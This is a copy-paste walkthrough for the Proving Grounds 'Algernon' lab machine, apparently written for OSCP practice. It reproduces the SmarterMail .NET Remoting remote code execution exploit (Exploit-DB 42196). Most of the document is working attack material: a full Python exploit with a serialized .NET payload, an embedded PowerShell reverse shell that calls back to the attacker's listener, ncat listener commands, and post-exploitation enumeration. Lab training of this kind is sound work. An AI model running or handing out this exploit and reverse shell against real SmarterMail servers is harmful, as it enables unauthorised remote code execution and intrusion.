# Proving Grounds — **Algernon** (SmarterMail .NET Remoting RCE, EDB-42196)

> **Purpose**: A copy-paste friendly walkthrough to reproduce the Algernon compromise using Exploit-DB **42196.py**.
> **Scope**: Lab use only. Use on systems you own or have explicit permission to test.

---

## Contents

* [Prerequisites](#prerequisites)
* [Get your VPN IP (LHOST)](#get-your-vpn-ip-lhost)
* [Recon (confirm the vulnerable port)](#recon-confirm-the-vulnerable-port)
* [Find the Exploit in Exploit-DB](#find-the-exploit-in-exploit-db)
* [Prepare a Clean Exploit File](#prepare-a-clean-exploit-file)
* [Known-Good, Sanitized `42196.py`](#known-good-sanitized-42196py)
* [Two-Terminal Workflow](#two-terminal-workflow)

  * [Terminal A — start the listener **first**](#terminal-a--start-the-listener-first)
  * [Terminal B — run the exploit](#terminal-b--run-the-exploit)
* [Post-Exploit (prove and locate flags)](#post-exploit-prove-and-locate-flags)
* [Troubleshooting](#troubleshooting)
* [Common OSCP/PG Mistakes (and fixes)](#common-oscppg-mistakes-and-fixes)
* [Cleanup](#cleanup)

---

## Prerequisites

All tools used are either built-in or installed with the lines below.

```bash
sudo apt update
sudo apt install -y ncat rlwrap nmap exploitdb  # ncat & rlwrap for a clean PS shell; searchsploit in exploitdb
python3 -V                                      # must exist (Kali has it by default)
```

---

## Get your VPN IP (LHOST)

```bash
# Shows your OffSec/PG tunnel interface
ip addr show tun0

# Prints only the IPv4 to copy (example output: 192.168.45.197)
ip -4 addr show tun0 | sed -n 's/ *inet \([0-9.]*\)\/.*/\1/p'
```

Set variables for convenience (adjust `TARGET` to the box you’re doing):

```bash
export LHOST=$(ip -4 addr show tun0 | sed -n 's/ *inet \([0-9.]*\)\/.*/\1/p')
export TARGET=192.168.186.65      # Algernon
export LPORT=4444
```

---

## Recon (confirm the vulnerable port)

```bash
sudo nmap -Pn -sT -p 17001 --reason $TARGET
# Expect: 17001/tcp open
```

> If 17001 is closed/filtered, this exploit will not land.

---

## Find the Exploit in Exploit-DB

```bash
searchsploit smartermail 6985
searchsploit CVE-2019-7214
searchsploit -x windows/remote/42196.py   # view code and path
```

You can copy from Exploit-DB or use the sanitized version below.

---

## Prepare a Clean Exploit File

```bash
cd ~/Downloads
nano 42196.py          # paste the code (from EDB or from the sanitized version below), then save
```

Remove any hidden **zero-width spaces** (U+200B) that break Python:

```bash
sed -i $'s/\u200b//g' 42196.py
```

Make sure the script has **your** details:

* `HOST='<target IP>'`   → `HOST='$TARGET'`
* `LHOST='<your tun0 IP>'` → `LHOST='$LHOST'`
* `LPORT=4444` (or 443 if you need egress-friendly)

You can patch placeholders automatically like this (only if you use the sanitized file with placeholders):

```bash
sed -i "s/{{TARGET_IP}}/$TARGET/" 42196.py
sed -i "s/{{YOUR_TUN0_IP}}/$LHOST/" 42196.py
sed -i "s/{{CALLBACK_PORT}}/$LPORT/" 42196.py
```

---

## Known-Good, Sanitized `42196.py`

> Uses only Python stdlib (`base64`, `socket`, `struct`).
> Uses **UTF-16LE** payload encoding (no BOM slicing).
> If you use this block, you may keep the `{{PLACEHOLDER}}` values and replace them with the `sed` lines above, or edit manually.

```python
#!/usr/bin/env python3
import base64, socket
from struct import pack

# ----------------- EDIT THESE THREE VALUES -----------------
HOST='{{TARGET_IP}}'        # e.g., 192.168.186.65  (Algernon)
PORT=17001
LHOST='{{YOUR_TUN0_IP}}'    # e.g., your tun0 like 192.168.45.197
LPORT={{CALLBACK_PORT}}     # e.g., 4444
# -----------------------------------------------------------

psh_shell = ('$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');'
             '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
             'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;'
             '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);'
             '$sendback = (iex $data 2>&1 | Out-String );'
             '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";'
             '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
             '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')

# Encode for .NET payload slot
psh_shell = base64.b64encode(psh_shell.encode('utf-16le'))
psh_shell = psh_shell.ljust(1360, b' ')  # keep exact length

# Payload blob (from EDB-42196)
payload = base64.b64decode(
'AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAPIKL2MgcG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhY=')

payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)
uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

msg  = b'.NET'        # header
msg += b'\x01\x00'    # version (major, minor)
msg += b'\x00\x00'    # operation type
msg += b'\x00\x00'    # content distribution
msg += pack('I', len(payload))
msg += b'\x04\x00'    # URI header
msg += b'\x01'        # data type
msg += b'\x01'        # UTF-8
msg += pack('I', len(uri))
msg += uri
msg += b'\x00\x00'    # terminating header
msg += payload

s.send(msg)
s.close()
```

---

## Two-Terminal Workflow

### Terminal A — start the listener **first**

```bash
# CRLF helps with PowerShell line endings
ncat --crlf -lvnp $LPORT

# Optional: better line editing/history
# rlwrap ncat --crlf -lvnp $LPORT
```

### Terminal B — run the exploit

```bash
python3 ~/Downloads/42196.py
```

Switch back to **Terminal A** (the listener). You should see:

```
Connection from 192.168.186.65:49xxx
PS C:\Windows\system32>
```

Type commands **in the listener window**:

```text
whoami
hostname
ls
cd C:\Users
ls
cat C:\Users\Public\Desktop\*.txt
```

> In PowerShell, `cat`, `ls`, and `cd` are valid aliases (`Get-Content`, `Get-ChildItem`, `Set-Location`).

---

## Post-Exploit (prove and locate flags)

```powershell
whoami /all
hostname
ipconfig /all

Get-ChildItem 'C:\Users\*\Desktop\' -Force -ErrorAction SilentlyContinue |
  Where-Object {$_.Name -match '^(local|user|proof)\.txt$'} |
  ForEach-Object { "`n$($_.FullName)"; Get-Content $_.FullName }
```

Fallback (slower, broad):

```powershell
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue `
 -Include local.txt,user.txt,proof.txt | ForEach-Object {
   "`n$($_.FullName)"; Get-Content $_.FullName
 }
```

---

## Troubleshooting

```bash
# 1) SyntaxError: invalid non-printable character U+200B
sed -i $'s/\u200b//g' 42196.py

# 2) No prompt/blank after connect
#    - Ensure listener used CRLF
#    - Press Enter once or twice
#    - Ensure exploit uses utf-16le encoding
ncat --crlf -lvnp $LPORT

# 3) No callback
#    - Confirm correct tun0 IP and port
ip -4 addr show tun0 | sed -n 's/ *inet \([0-9.]*\)\/.*/\1/p'
#    - Try egress-friendly 443
sudo ncat --crlf -lvnp 443
sed -i 's/LPORT=.*/LPORT=443/' 42196.py
#    - Verify target port is open
sudo nmap -Pn -sT -p 17001 --reason $TARGET
```

---

## Common OSCP/PG Mistakes (and fixes)

* Using the **wrong LHOST** (host OS or old IP). Always use **tun0**.
* Starting the **listener after** running the exploit. Start **Terminal A first**.
* Typing commands in the **wrong terminal**. Commands go in the listener tab that shows *“Connection from …”*.
* Copy/paste artifacts (U+200B). Strip with `sed -i $'s/\u200b//g'`.
* Assuming **no ping = host down**. Many boxes block ICMP; use `-Pn`/TCP.
* PowerShell line-ending issues. Use `ncat --crlf`.
* Payload encoding edge cases. Use `utf-16le` rather than slicing a BOM.

---

## Cleanup

When finished, close the reverse shell and remove any temporary files you created. If you added accounts/services/registry changes for persistence in your own lab, revert them.

---

**Notes**

* Exploit: SmarterMail ≤ 6985 .NET Remoting RCE (Exploit-DB 42196).

